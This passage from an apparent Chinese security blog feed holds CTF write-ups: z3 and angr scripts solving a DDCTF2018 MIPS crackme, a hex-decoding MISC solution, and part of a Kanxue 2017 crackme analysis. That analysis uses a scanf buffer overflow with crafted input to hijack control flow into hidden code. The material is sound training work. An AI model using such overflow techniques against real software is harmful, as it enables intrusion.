+0x5d80*a[5]+0xb25e*a[6]+0x2447*a[7]+0xba8a*a[8]+0xbb41*a[9]+0xa3a8*a[10]+0xcb12*a[11]-0x6958*a[12]+0x5821*a[13]+0x77ed*a[14]+0xf7ff*a[15] == 0x162f0ca )</span><br><span class="line">s.add(0xeb44*a[0]-0x0f99*a[1] - 0x40e7*a[2] +0xdf2e*a[3] -0x4b2e*a[4] -0x96b5*a[5] +0x9d66*a[6] -0xafa8*a[7] -0x6e26*a[8] -0xe655*a[9]- 0x9a6e*a[10] +0x57ba*a[11] -0x227c*a[12] +0xbdd1*a[13] +0xb437*a[14] +0x5d3f*a[15]== 0xffec2e48)</span><br><span class="line">s.add(0xe6f1*a[0] +0xa4b2*a[1] -0xfe74*a[2] -0x0f07*a[3] -0x5d22*a[4] -0xb845*a[5] -0x9954*a[6] +0x93ac*a[7] -0x51e4*a[8] -0x4b11*a[9] +0xdc93*a[10] +0x13f8*a[11] +0x246c*a[12] +0xf121*a[13] +0xf09f*a[14] +0x0dfa*a[15] == 0xd3c060)</span><br><span class="line">s.add(0xffff7085*a[0] -0x6623*a[1] +0x0686*a[2] +0x4b2d*a[3] +0x68df*a[4] +0x9be7*a[5] +0x21b4*a[6] +0xe25a*a[7] -0xc807*a[8] +0xf695*a[9] -0x5421*a[10] -0x2469*a[11] +0x9f29*a[12] -0xe311*a[13] +0x78f2*a[14] -0x6bda*a[15] == 0x8bf576)</span><br><span class="line">s.add(0xffff07b8*a[0] -0xd048*a[1] -0x85f1*a[2] +0xee84*a[3] -0x37d1*a[4] +0xb74a*a[5] +0xcfe2*a[6]+ 0x8f1e*a[7] -0xf211*a[8] -0x83bf*a[9] -0x1249*a[10] +0x7ea7*a[11] -0x4294*a[12] -0xb661*a[13] -0x8a73*a[14] -0x5e5c*a[15] == 0xff4ea5b3)</span><br><span class="line">s.add(0xffffd6b5*a[0] -0x2b5f*a[1]+ 0xc981*a[2] -0x60c3*a[3] +0xf8f2*a[4]+ 0xded7*a[5]- 0xf6fb*a[6] +0x1083*a[7]- 0xdc96*a[8]- 0x587e*a[9] -0xb4f5*a[10] +0xf57a*a[11] +0x57d0*a[12] +0xe814*a[13] +0x6169*a[14] +0xf285*a[15] == 0x9dd61e)</span><br><span class="line">s.add(0xcd89*a[0] -0xd43d*a[1] +0xf037*a[2] +0x83a8*a[3] -0xa305*a[4] -0xadef*a[5] +0xcaaa*a[6] -0xf145*a[7]- 0x6073*a[8]- 0x2777*a[9] +0x794f*a[10] +0xf00e*a[11] -0xe7d5*a[12] +0x2654*a[13] -0xbed0*a[14] -0xb8af*a[15] == 0xff6baab3)</span><br><span class="line">s.add(0xffff6108*a[0] -0x6766*a[1] +0xd58e*a[2] -0x5ca3*a[3] +0x2718*a[4] +0x1e2b*a[5] -0xf49e*a[6] +0xcf78*a[7] +0x7c09*a[8] -0x13b7*a[9] -0xbeee*a[10]- 0xe450*a[11] +0x4da3*a[12] -0x8880*a[13] -0x5691*a[14] +0x8bd8*a[15] == 0xff818f06)</span><br><span class="line">s.add(0xffffa564*a[0] -0xa95a*a[1] -0xe643*a[2] +0x0d38*a[3] -0x097a*a[4] -0xeb22*a[5] +0xcac3*a[6] -0x4ed1*a[7] -0x7c8a*a[8] +0xf107*a[9] +0xa59e*a[10]- 0x1213*a[11] +0xb2b5*a[12] -0x7213*a[13] -0x2b83*a[14] -0xa155*a[15] == 0xff8d50e7)</span><br><span class="line">s.add(0xffff6c45*a[0] -0x2752*a[1] -0xbdc3*a[2] -0xf495*a[3] -0x7121*a[4] +0x9c41*a[5] -0x9465*a[6]- 0x6ce3*a[7] -0x4f28*a[8] -0x8350*a[9] -0x176e*a[10] +0x7814*a[11] -0x739a*a[12] +0x5494*a[13] +0x142d*a[14] +0xca55*a[15] == 0xff3f9826)</span><br><span class="line">s.add(0xcf01*a[0] +0xf378*a[1] +0x1064*a[2] -0xd9a7*a[3] -0x077d*a[4]+ 0x6dab*a[5] -0xaf1f*a[6]- 0x3db7*a[7] +0x3554*a[8] -0xcb8e*a[9] -0x9815*a[10]+ 0xf30b*a[11] +0x9c5e*a[12] -0x5d07*a[13] -0x4c31*a[14] +0xeae0*a[15] == 0x213fed)</span><br><span class="line">s.add(0x8bd4*a[0] -0x6d81*a[1] -0xe772*a[2] +0xb6f1*a[3] +0x9b57*a[4] -0x597d*a[5] +0x15d1*a[6]- 0xa55e*a[7]+ 0xfd13*a[8]+ 0x17b4*a[9] +0xec78*a[10] -0xd51a*a[11] +0x56ad*a[12] -0xc319*a[13] +0x9f8e*a[14] +0xfa17*a[15] == 0xa9f0dc)</span><br><span class="line">s.add(0xffffb798*a[0] -0x8bef*a[1] +0x109d*a[2]- 0xf9d4*a[3] +0x4ecf*a[4] +0xa896*a[5] +0x773b*a[6] +0x6e8a*a[7] -0x737c*a[8]+ 0x4979*a[9] +0xc685*a[10] -0x96ae*a[11] +0x0bbd*a[12] +0x8280*a[13] +0xe3a9*a[14] -0x730c*a[15] == 0xbdeb20)</span><br><span class="line">s.add(0x0b20*a[0] +0x9b9c*a[1] +0xb4aa*a[2]+ 0x6176*a[3] +0x9670*a[4] +0x7c9d*a[5] -0x5402*a[6] -0x8cd2*a[7] +0xac82*a[8] +0xa2f5*a[9] -0x8efd*a[10] -0x65f1*a[11] -0x94b9*a[12] +0x8cb8*a[13] +0x1cb5*a[14] +0x4aa1*a[15] == 0x9c7cf5)</span><br><span class="line">s.add(0x57fd*a[0] +0x3d83*a[1] +0xf745*a[2] +0xa5c4*a[3] -0x65fa*a[4] -0x58e9*a[5] +0xbebe*a[6] +0x1820*a[7] -0xd7b9*a[8] -0xb21f*a[9] -0x76a0*a[10] +0xc60d*a[11] +0x168f*a[12] +0x2a96*a[13] +0x31d6*a[14] -0x4b88*a[15] == 0xd08e2)</span><br><span class="line">s.add(0xffff1bae*a[0] -0xc7d4*a[1] -0x1554*a[2] +0x7eea*a[3] -0x684d*a[4] +0x6adb*a[5] +0x8534*a[6] -0x3a36*a[7] +0x29f0*a[8] +0xd3f2*a[9] -0x23e5*a[10] -0x6540*a[11] +0xbcd3*a[12] -0xef9b*a[13] +0xefdb*a[14] -0x774e*a[15] == 0x178803)</span><br><span class="line"></span><br><span class="line">for item in a:</span><br><span class="line">    s.add(item &gt; 0, item &lt; 127)</span><br><span class="line"></span><br><span class="line">if s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    flag = []</span><br><span class="line">    for i in xrange(16):</span><br><span class="line">        flag.append(m[a[i]].as_long())</span><br><span class="line">    print &apos;&apos;.join(map(chr, flag))</span><br></pre></td></tr></table></figure><h3 id="angr二进制自动化分析及符号执行"><a href="#angr二进制自动化分析及符号执行" class="headerlink" title="angr二进制自动化分析及符号执行"></a>angr二进制自动化分析及符号执行</h3><p>angr是一个基于python的二进制漏洞分析框架，集成了多种主流的分析技术，能够进行动态的符号执行分析和多种静态分析。</p><p>如果我们使用angr的话，就不再需要考虑算法内部的详细原理，利用符号执行可以大大减少分析时间</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:00403620                 lw      $gp, 0x98+var_50($fp)</span><br><span class="line">.text:00403624                 addiu   $v0, $fp, 0x98+var_48</span><br><span class="line">.text:00403628                 move    $a0, $v0</span><br><span class="line">.text:0040362C                 jal     sub_400420</span><br><span class="line">.text:00403630                 nop</span><br><span class="line">.text:00403634                 lw      $gp, 0x98+var_50($fp)</span><br><span class="line">.text:00403638                 beqz    $v0, loc_4036E4</span><br><span class="line">.text:0040363C                 nop</span><br></pre></td></tr></table></figure><p>通过静态分析可知，程序在0x40362c处调用sub_400420函数，其参数通过寄存器a0传递，然后返回值保存在v0寄存器中。之后对v0的内容进行判断，如果为1则输出flag(flag与用户输入的内容相关)，为0则输出”Wrong”。因此，只需要求解输入，保证sub_400420的返回值为1即可。</p><p>angr脚本<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">import angr</span><br><span class="line"></span><br><span class="line">project = angr.Project(&apos;./patch&apos;, load_options=&#123;&apos;auto_load_libs&apos;:False&#125;)</span><br><span class="line"></span><br><span class="line">start_address = 0x400420</span><br><span class="line">memory_address = 0x10000000</span><br><span class="line"></span><br><span class="line">find_address = 0x4031F0</span><br><span class="line">avoid_address = (0x4019E4, 0x401b7c,0x401D18, 0x401EB0, 0x40204C, 0x4021E4, 0x40237C, 0x402518, 0x4026B4, 0x40284C, 0x4029E4, 0x402B7C, 0x402D14, 0x402EB0, 0x403048, 0x4031E0)</span><br><span class="line"></span><br><span class="line">state = project.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line">for i in xrange(16):</span><br><span class="line">    state.memory.store(memory_address+i*4, state.solver.BVS(&apos;a%d&apos; % i, 32), endness=state.arch.memory_endness)</span><br><span class="line"></span><br><span class="line">state.regs.a0 = memory_address</span><br><span class="line"></span><br><span class="line"># add LAZY_SOLVES to speed up</span><br><span class="line">simgr = project.factory.simulation_manager(state, add_options=&#123;angr.options.LAZY_SOLVES&#125;)</span><br><span class="line"></span><br><span class="line">simgr.explore(find=find_address, avoid=avoid_address)</span><br><span class="line"></span><br><span class="line">if simgr.found:</span><br><span class="line">    find_state = simgr.found[0]</span><br><span class="line"></span><br><span class="line">    # add constraints to reduce the keyspace</span><br><span class="line">    for i in xrange(16):</span><br><span class="line">        value = find_state.memory.load(memory_address+i*4,4, endness=find_state.arch.memory_endness)</span><br><span class="line">        find_state.add_constraints(value &gt; 0, value &lt; 127)</span><br><span class="line"></span><br><span class="line">    flag = [find_state.se.eval(find_state.memory.load(memory_address+i*4, 4, endness=find_state.arch.memory_endness)) for i in xrange(16)]</span><br><span class="line">    print &apos;&apos;.join(map(chr,flag))</span><br></pre></td></tr></table></figure></p><p>返回1的地址<br><img src="https://i.loli.net/2018/07/16/5b4c618f5dc80.jpg" alt="mark"></p><p><img src="https://i.loli.net/2018/07/16/5b4c6199a3626.jpg" alt="mark"><br>find_address是使得函数sub_400420返回值为1的地址，而avoid_address是使得函数sub_400420返回值为0的地址。同时，将输入的16个数字保存在内存地址0x10000000处，然后将其赋值给a0寄存器，实现参数的传递。之后，直接从函数sub_400420的开始处开始分析。</p><hr><p>第二种</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from angr import *</span><br><span class="line">import logging</span><br><span class="line">import IPython</span><br><span class="line">logging.getLogger(&apos;angr.manager&apos;).setLevel(logging.DEBUG)</span><br><span class="line">p = Project(&apos;baby_mips&apos;)</span><br><span class="line">state = p.factory.blank_state(addr=0x400420)</span><br><span class="line">DATA_ADDR = 0xA0000</span><br><span class="line">state.regs.a0 = DATA_ADDR</span><br><span class="line">for i in range(16*4):</span><br><span class="line">    vec = state.solver.BVS(&quot;c&#123;&#125;&quot;.format(i),8,explicit_name=True)</span><br><span class="line">    cond = state.solver.And(vec&gt;=32,vec&lt;=126) # low byte</span><br><span class="line">    state.memory.store(DATA_ADDR+i,vec)</span><br><span class="line">    if i % 4 == 0:</span><br><span class="line">        pass</span><br><span class="line">    #state.add_constraints(cond)</span><br><span class="line">sm = p.factory.simulation_manager(state)</span><br><span class="line">res = sm.explore(find=0x4031F0,avoid=[0x4019E4, 0x401b7c,0x401D18, 0x401EB0, 0x40204C, 0x4021E4, 0x40237C, 0x402518, 0x4026B4, 0x40284C, 0x4029E4, 0x402B7C, 0x402D14, 0x402EB0, 0x403048, 0x4031E0])</span><br><span class="line"></span><br><span class="line">found = res.found[0]</span><br><span class="line">mem = found.memory.load(DATA_ADDR,16*4)</span><br><span class="line">print found.solver.eval(mem)</span><br><span class="line">print &apos;##########################################&apos;</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for i in range(16):</span><br><span class="line">    v = found.memory.load(DATA_ADDR + 4*i,1)</span><br><span class="line">    flag = flag + found.solver.eval(v,cast_to=str)</span><br><span class="line">print flag  #7fe2c58fc9a7eb90</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/07/16/5b4c6199c866b.jpg" alt="mark"></p><p>flag每个人都是不一样的，我的用angr解的话，最后得到的是7fe2c58fc9a7eb90</p><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><p>于是flag: DDCTF{7fe2c58fc9a7eb90}</p><p>z3解的话还可以得出具体每个变量的值，这里就不放图了</p><p>From <a href="https://kabeor.github.io/DDCTF2018 Reverse writeup(1">https://kabeor.github.io/DDCTF2018 Reverse writeup(1) baby_mips/</a> baby_mips/) bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DDCTF2018-Reverse-writeup&quot;&gt;&lt;a href=&quot;#DDCTF2018-Reverse-writeup&quot; class=&quot;headerlink&quot; title=&quot;DDCTF2018 Reverse writeup&quot;&gt;&lt;/a&gt;DDCTF2018 R
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="writeup" scheme="https://kabeor.github.io/tags/writeup/"/>
    
      <category term="DDCTF2018" scheme="https://kabeor.github.io/tags/DDCTF2018/"/>
    
      <category term="Reverse" scheme="https://kabeor.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>DDCTF2018 MISC writeup</title>
    <link href="https://kabeor.github.io/DDCTF2018%20MISC%20writeup/"/>
    <id>https://kabeor.github.io/DDCTF2018 MISC writeup/</id>
    <published>2018-05-03T13:33:30.217Z</published>
    <updated>2018-07-16T09:24:46.274Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DDCTF2018-MISC-writeup"><a href="#DDCTF2018-MISC-writeup" class="headerlink" title="DDCTF2018 MISC writeup"></a>DDCTF2018 MISC writeup</h1><h2 id="1-签到题"><a href="#1-签到题" class="headerlink" title="1.签到题"></a>1.签到题</h2><h2 id="2-╯°□°）╯︵-┻━┻"><a href="#2-╯°□°）╯︵-┻━┻" class="headerlink" title="2.(╯°□°）╯︵ ┻━┻"></a>2.(╯°□°）╯︵ ┻━┻</h2><p>给了一段编码</p><blockquote><p> d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd</p></blockquote><p>可以看到这串字符只有数字和字母a-f，所以猜测应该是16进制。可以用异或的条件来判断一下，如果与ascii码异或以后得到的是正确的字符的话，异或的结果将不会是乱码。</p><p>思路感觉还是靠经验吧，各种各样的方法，不过总体来说是用<strong>移位爆破</strong>出来的</p><p>下面是两种解题脚本<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s=&quot;d4 e8 e1 f4 a0 f7 e1 f3 a0 e6 e1 f3 f4 a1 a0 d4 e8 e5 a0 e6 ec e1 e7 a0 e9 f3 ba a0 c4 c4 c3 d4 c6 fb b7 b9 b8 e4 b5 b5 e4 e2 b7 b6 b5 b5 b2 e1 b9 b2 b2 e4 b0 b0 e4 b7 b7 b5 e5 b3 b3 b1 b1 b9 b0 b7 fd&quot;</span><br><span class="line">s=s.split()</span><br><span class="line">for key in range(0,128+1,1):</span><br><span class="line">    for i in s:</span><br><span class="line">        i = int(i,16)</span><br><span class="line">        print (chr((i + key + 256) % 256 ), end = &apos;&apos;)</span><br><span class="line">    print (key)</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data=bytearray.fromhex(&apos;d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9e1e6b3e3b9e4b3b7b7e2b6b1e4b2b6b9e2b1b1b3b3b7e6b3b3b0e3b9b3b5e6fd&apos;)</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for i in data:</span><br><span class="line">    flag = flag + chr(i &amp; 0x7f)</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><p>最后得出flag</p><blockquote><p>That was fast! The flag is: DDCTF{798d55db76552a922d00d775e3311907}</p></blockquote><p>## </p><p>待补充</p><p>From <a href="https://kabeor.github.io/DDCTF2018 MISC writeup/">https://kabeor.github.io/DDCTF2018 MISC writeup/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DDCTF2018-MISC-writeup&quot;&gt;&lt;a href=&quot;#DDCTF2018-MISC-writeup&quot; class=&quot;headerlink&quot; title=&quot;DDCTF2018 MISC writeup&quot;&gt;&lt;/a&gt;DDCTF2018 MISC write
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="writeup" scheme="https://kabeor.github.io/tags/writeup/"/>
    
      <category term="DDCTF2018" scheme="https://kabeor.github.io/tags/DDCTF2018/"/>
    
      <category term="MISC" scheme="https://kabeor.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>看雪.TSRC 2017CTF秋季赛 ctf2017_Fpc</title>
    <link href="https://kabeor.github.io/%E7%9C%8B%E9%9B%AA.TSRC%202017CTF%E7%A7%8B%E5%AD%A3%E8%B5%9B%20ctf2017_Fpc/"/>
    <id>https://kabeor.github.io/看雪.TSRC 2017CTF秋季赛 ctf2017_Fpc/</id>
    <published>2018-04-26T15:13:56.689Z</published>
    <updated>2018-07-16T09:30:49.530Z</updated>
    
    <content type="html"><![CDATA[<h1 id="看雪-TSRC-2017CTF秋季赛-ctf2017-Fpc"><a href="#看雪-TSRC-2017CTF秋季赛-ctf2017-Fpc" class="headerlink" title="看雪.TSRC 2017CTF秋季赛 ctf2017_Fpc"></a>看雪.TSRC 2017CTF秋季赛 ctf2017_Fpc</h1><blockquote><p>自己做再加上分析别人的wp搞了一星期，这道题终于分析透彻了，感觉自己提升了很多。<br>从这道题中学到的新知识有：</p><ol><li>scanf函数的缓冲区溢出漏洞</li><li>RUN跟踪去除花指令</li><li>Z3约束求解器的使用</li></ol></blockquote><h2 id="基本工作"><a href="#基本工作" class="headerlink" title="基本工作"></a>基本工作</h2><p>无壳的exe</p><p>运行一下<br><img src="https://i.loli.net/2018/07/16/5b4c64eb112d1.jpg" alt="mark"></p><p>搜索字符串<br><img src="https://i.loli.net/2018/07/16/5b4c64eb4595b.jpg" alt="mark"><br>进入Please input your code<br>运行后在输入字符串位置断下<br><img src="https://i.loli.net/2018/07/16/5b4c64eb73a1d.jpg" alt="mark"><br>所以接下来就是算法分析了</p><h2 id="结构分析"><a href="#结构分析" class="headerlink" title="结构分析"></a>结构分析</h2><p>IDA载入，找到主函数<br><img src="https://i.loli.net/2018/07/16/5b4c64eb8d7fd.jpg" alt="mark"></p><blockquote><p>main函数内部</p></blockquote><p><img src="https://i.loli.net/2018/07/16/5b4c64eba5379.jpg" alt="mark"></p><p>dword_41B034的初值为2</p><p>可以看到判断是否成功前调用了三个call 401050，401090和4010E0<br>其中401050为打印题目并调用    <code>scanf()</code>    <strong>(注意，这很重要，后面有解释)</strong></p><p>后两个看来就是解密函数了，分析一下</p><blockquote><p>sub_401090</p></blockquote><p><img src="https://i.loli.net/2018/07/16/5b4c64ebbce31.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/16/5b4c64ebd2705.jpg" alt="mark"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:00401090 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:00401090</span><br><span class="line">.text:00401090 ; Attributes: bp-based frame</span><br><span class="line">.text:00401090</span><br><span class="line">.text:00401090 sub_401090      proc near               ; CODE XREF: _main+1Cp</span><br><span class="line">.text:00401090</span><br><span class="line">.text:00401090 var_C           = dword ptr -0Ch</span><br><span class="line">.text:00401090 var_8           = dword ptr -8</span><br><span class="line">.text:00401090 var_4           = dword ptr -4</span><br><span class="line">.text:00401090</span><br><span class="line">.text:00401090                 push    ebp</span><br><span class="line">.text:00401091                 mov     ebp, esp</span><br><span class="line">.text:00401093                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:00401096                 test    ecx, ecx</span><br><span class="line">.text:00401098                 jz      short loc_4010D7</span><br><span class="line">.text:0040109A                 mov     edx, [ebp+var_8]</span><br><span class="line">.text:0040109D                 test    edx, edx</span><br><span class="line">.text:0040109F                 jz      short loc_4010D7</span><br><span class="line">.text:004010A1                 mov     eax, ecx</span><br><span class="line">.text:004010A3                 sub     eax, edx</span><br><span class="line">.text:004010A5                 jz      short loc_4010D7</span><br><span class="line">.text:004010A7                 mov     [ebp+var_C], eax</span><br><span class="line">.text:004010AA                 imul    eax, 5</span><br><span class="line">.text:004010AD                 add     ecx, eax</span><br><span class="line">.text:004010AF                 cmp     ecx, 8F503A42h</span><br><span class="line">.text:004010B5                 jnz     short loc_4010D7</span><br><span class="line">.text:004010B7                 mov     eax, [ebp+var_C]</span><br><span class="line">.text:004010BA                 imul    eax, 0Dh</span><br><span class="line">.text:004010BD                 add     edx, eax</span><br><span class="line">.text:004010BF                 cmp     edx, 0EF503A42h</span><br><span class="line">.text:004010C5                 jnz     short loc_4010D7</span><br><span class="line">.text:004010C7                 mov     edx, 543F30h</span><br><span class="line">.text:004010CC                 xor     edx, 158F04h</span><br><span class="line">.text:004010D2                 mov     eax, [edx]</span><br><span class="line">.text:004010D4                 dec     eax</span><br><span class="line">.text:004010D5                 mov     [edx], eax</span><br><span class="line">.text:004010D7</span><br><span class="line">.text:004010D7 loc_4010D7:                             ; CODE XREF: sub_401090+8j</span><br><span class="line">.text:004010D7                                         ; sub_401090+Fj ...</span><br><span class="line">.text:004010D7                 mov     esp, ebp</span><br><span class="line">.text:004010D9                 pop     ebp</span><br><span class="line">.text:004010DA                 retn</span><br><span class="line">.text:004010DA sub_401090      endp</span><br><span class="line">.text:004010DA</span><br><span class="line">.text:004010DA ; </span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/07/16/5b4c64ebf02eb.jpg" alt="mark"></p><p>方程</p><blockquote><p>x!=0<br>y!=0<br>x!=y<br>5(y-x)+y=0x8F503A42<br>13(y-x)+x=0xEF503A42</p><p>sub_4010E0<br><img src="https://i.loli.net/2018/07/16/5b4c64ec1506a.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/16/5b4c652d32a3b.jpg" alt="mark"></p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:004010E0 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:004010E0</span><br><span class="line">.text:004010E0 ; Attributes: bp-based frame</span><br><span class="line">.text:004010E0</span><br><span class="line">.text:004010E0 sub_4010E0      proc near               ; CODE XREF: _main+21p</span><br><span class="line">.text:004010E0</span><br><span class="line">.text:004010E0 var_C           = dword ptr -0Ch</span><br><span class="line">.text:004010E0 var_8           = dword ptr -8</span><br><span class="line">.text:004010E0 var_4           = dword ptr -4</span><br><span class="line">.text:004010E0</span><br><span class="line">.text:004010E0                 push    ebp</span><br><span class="line">.text:004010E1                 mov     ebp, esp</span><br><span class="line">.text:004010E3                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:004010E6                 test    ecx, ecx</span><br><span class="line">.text:004010E8                 jz      short loc_401127</span><br><span class="line">.text:004010EA                 mov     edx, [ebp+var_8]</span><br><span class="line">.text:004010ED                 test    edx, edx</span><br><span class="line">.text:004010EF                 jz      short loc_401127</span><br><span class="line">.text:004010F1                 mov     eax, ecx</span><br><span class="line">.text:004010F3                 sub     eax, edx</span><br><span class="line">.text:004010F5                 jz      short loc_401127</span><br><span class="line">.text:004010F7                 mov     [ebp+var_C], eax</span><br><span class="line">.text:004010FA                 imul    eax, 11h</span><br><span class="line">.text:004010FD                 add     ecx, eax</span><br><span class="line">.text:004010FF                 cmp     ecx, 0F3A94883h</span><br><span class="line">.text:00401105                 jnz     short loc_401127</span><br><span class="line">.text:00401107                 mov     eax, [ebp+var_C]</span><br><span class="line">.text:0040110A                 imul    eax, 7</span><br><span class="line">.text:0040110D                 add     edx, eax</span><br><span class="line">.text:0040110F                 cmp     edx, 33A94883h</span><br><span class="line">.text:00401115                 jnz     short loc_401127</span><br><span class="line">.text:00401117                 mov     edx, 543F30h</span><br><span class="line">.text:0040111C                 xor     edx, 158F04h</span><br><span class="line">.text:00401122                 mov     eax, [edx]</span><br><span class="line">.text:00401124                 dec     eax</span><br><span class="line">.text:00401125                 mov     [edx], eax</span><br><span class="line">.text:00401127</span><br><span class="line">.text:00401127 loc_401127:                             ; CODE XREF: sub_4010E0+8j</span><br><span class="line">.text:00401127                                         ; sub_4010E0+Fj ...</span><br><span class="line">.text:00401127                 mov     esp, ebp</span><br><span class="line">.text:00401129                 pop     ebp</span><br><span class="line">.text:0040112A                 retn</span><br><span class="line">.text:0040112A sub_4010E0      endp</span><br><span class="line">.text:0040112A</span><br><span class="line">.text:0040112A ; </span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/07/16/5b4c652d46d23.jpg" alt="mark"></p><p>方程</p><blockquote><p>x!=0<br>y!=0<br>x!=y<br>17(y-x)+y=0xF3A94883<br>7(y-x)+x=0x33A94883</p></blockquote><p>这两个函数的方程要满足唯一解很难，并且也不是出题人本意，据说有人解了一天没解出来</p><h2 id="更换思路"><a href="#更换思路" class="headerlink" title="更换思路"></a>更换思路</h2><p>我们再回到主函数分析，再次看到这个scanf(),并且往后翻有大量未识别的数据，从00413131开始<br><img src="https://i.loli.net/2018/07/16/5b4c652d5a74d.jpg" alt="mark"></p><p>于是我们可以考虑一下<strong>缓冲区溢出</strong></p><p><img src="https://i.loli.net/2018/07/16/5b4c652d6ffc0.jpg" alt="mark"></p><p><img src="https://i.loli.net/2018/07/16/5b4c652d94199.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/16/5b4c652da7a36.jpg" alt="mark"></p><p>可以看到，我们输入信息一开始保存在0012FF2C,栈清空后保存在0012FF3C，于是十六进制下3C-2C=10，也就是十进制下的16。<strong>因此如果要覆盖返回地址需要构造12字节的信息外加4个字节的返回地址。</strong><br>我们事实上可以直接覆盖到You get it的地址，因为比赛限制flag只为字母和数字，因此需要另想其他办法</p><p>在IDA中往下翻翻，看到有一大串未识别的数据，于是猜想有可能应该溢出到这里<br><img src="https://i.loli.net/2018/07/16/5b4c652dbaf5e.jpg" alt="mark"><br>首地址为00413131<br>转换成ASCII为A11<br>因为数据在内存中为小段排序，于是应该转换为11A<br>所以我们可以使用测试数据1234567890ab11A来溢出到那段数据</p><p>成功跳入，然后右键分析-&gt;从模块中删除分析识别出正确代码。<br>看到一堆跳转<br><img src="https://i.loli.net/2018/07/16/5b4c652ddf9e7.jpg" alt="mark"></p><p>这里是花指令了</p><h3 id="使用RUN跟踪去除花指令"><a href="#使用RUN跟踪去除花指令" class="headerlink" title="使用RUN跟踪去除花指令"></a>使用RUN跟踪去除花指令</h3><p>断在0x413131处后, 点击菜单栏的”查看”, 选择”RUN跟踪”, 然后再点击”调试”, 选择”跟踪步入”, 程序会记录这段花指令执行的过程<br><img src="https://i.loli.net/2018/07/16/5b4c652e1124e.jpg" alt="mark"></p><p>我觉得应该是把最后一栏显示寄存器的指令提取出来<br>但目前程序显示错误<br><img src="https://i.loli.net/2018/07/16/5b4c653d3e989.jpg" alt="mark"><br>所以先从前向后记录这些有用指令，然后在下面发现一个奇怪的跳转<br><img src="https://i.loli.net/2018/07/16/5b4c653d6140f.jpg" alt="mark"><br>这个跳转后面没有short，也不显示寄存器，而且显然跳转之后导致了错误，因此我们把这里的跳转改掉或下断点修改标志位，重新跟踪<br>然后还有两个jnz<br><img src="https://i.loli.net/2018/07/16/5b4c653d86588.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/16/5b4c653da9f9f.jpg" alt="mark"></p><p>最后一个跳转修改完，跟踪会抛出一个异常<br><img src="https://i.loli.net/2018/07/16/5b4c653dc094c.jpg" alt="mark"></p><p>我们提取这之前的有效代码,一共三段验证<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vaild_1:</span><br><span class="line">00413131    83C4 F0         add esp,-0x10</span><br><span class="line">00413150    33C0            xor eax,eax</span><br><span class="line">00413184    A3 34B04100     mov dword ptr ds:[0x41B034],eax</span><br><span class="line">004131BA    58              pop eax</span><br><span class="line">004131EB    8BC8            mov ecx,eax                            </span><br><span class="line">0041321F    58              pop eax</span><br><span class="line">00413254    8BD8            mov ebx,eax                </span><br><span class="line">00413289    58              pop eax</span><br><span class="line">004132B5    8BD0            mov edx,eax                    </span><br><span class="line">004132AD    8BD0            mov edx,eax</span><br><span class="line">004132E2    8BC1            mov eax,ecx</span><br><span class="line">00413316    2BC3            sub eax,ebx                </span><br><span class="line">00413349    C1E0 02         shl eax,0x2</span><br><span class="line">00413380    03C1            add eax,ecx</span><br><span class="line">004133B5    03C2            add eax,edx</span><br><span class="line">004133E9    2D E217F9EA     sub eax,0xEAF917E2</span><br><span class="line">00413420   /0F85 DD060000   jnz ctf2017_.00413B03</span><br><span class="line"> </span><br><span class="line">vaild_2:                   </span><br><span class="line">00413455    03C1            add eax,ecx                                </span><br><span class="line">00413489    2BC3            sub eax,ebx                </span><br><span class="line">004134BF    8BD8            mov ebx,eax                </span><br><span class="line">004134F3    D1E0            shl eax,1                      </span><br><span class="line">00413525    03C3            add eax,ebx                </span><br><span class="line">00413559    03C1            add eax,ecx                </span><br><span class="line">0041358F    8BC8            mov ecx,eax                </span><br><span class="line">004135C3    03C2            add eax,edx                </span><br><span class="line">004135F7    2D C808F5E8     sub eax,0xE8F508C8</span><br><span class="line">0041362E   /0F85 CF040000   jnz ctf2017_.00413B03</span><br><span class="line"> </span><br><span 